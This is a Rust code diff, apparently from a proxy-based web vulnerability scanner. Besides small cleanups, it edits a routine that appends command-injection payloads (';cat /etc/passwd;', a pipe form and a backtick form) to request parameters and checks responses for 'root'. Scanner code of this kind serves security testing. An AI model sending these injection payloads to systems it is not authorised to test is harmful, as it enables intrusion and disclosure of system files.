@@ -1,6 +1,4 @@
 use async_std::prelude::*;
-use hyper::body::HttpBody;
-use tokio::io::{stdout, AsyncWriteExt};
 use futures::stream::{TryStreamExt};
 use crate::cli::Config;
 use crate::proxy::proxy_handler::handle::http_request::store_request;
@@ -9,7 +7,7 @@ pub async fn send_request(req: &str) {
     let req = parse_request(req.to_string()).await;
     let req = store_request(req).await;
     let client = hyper::Client::new();
-    let mut resp = client.request(req).await.unwrap();
+    let resp = client.request(req).await.unwrap();
     println!("{:?}", resp);
     let body = resp.into_body();
     let entire_body = body
@@ -80,7 +78,7 @@ pub async fn scan_request(req_raw: &str) {
 //    let mut requests: Vec<hyper::Request<hyper::Body>> = Vec::new();
     let mut requests = Vec::new();
     //scan headers
-    for header in before_body.iter() {
+    for _header in before_body.iter() {
 
         if curr >= before_body.len() {
             break;
@@ -138,9 +136,9 @@ pub async fn scan_request(req_raw: &str) {
                 let mut args2 = args.clone();
                 let mut args3 = args.clone();
 
-                let new_a1 = &format!("{}{}",args[i.clone()].clone(), ";cat /etc/passwd;");
-                let new_a2 = &format!("{}{}",args[i.clone()].clone(), "|cat /etc/passwd|");
-                let new_a3 = &format!("{}{}",args[i.clone()].clone(), "`cat /etc/passwd`");
+                let new_a1 = &format!("{}{}",arg.clone(), ";cat /etc/passwd;");
+                let new_a2 = &format!("{}{}",arg.clone(), "|cat /etc/passwd|");
+                let new_a3 = &format!("{}{}",arg.clone(), "`cat /etc/passwd`");
 
                 args1[i.clone()] = new_a1;
                 args2[i.clone()] = new_a2;
@@ -214,7 +212,6 @@ pub async fn scan_request(req_raw: &str) {
     }
 
     use futures::prelude::*;
-    use futures::future::{select_all, ok, err};
     let unpin_futs: Vec<_> = requests.into_iter().map(Box::pin).collect();
     let mut futs = unpin_futs;
     let num_of_checks = futs.len();
@@ -247,9 +244,8 @@ async fn check_request(req: hyper::Request<hyper::Body>, param_name: String) -> 
     let method = format!("{}", req.method());
     let uri = format!("{}", req.uri());
     let client = hyper::Client::new();
-    let mut resp = client.request(req).await.unwrap();
+    let resp = client.request(req).await.unwrap();
     //@TODO сохранить в строку тело и проверить наличие  root
-    use futures::stream::{TryStreamExt};
     let response_body = resp.into_body()
         .try_fold(Vec::new(), |mut data, chunk| async move {
             data.extend_from_slice(&chunk);
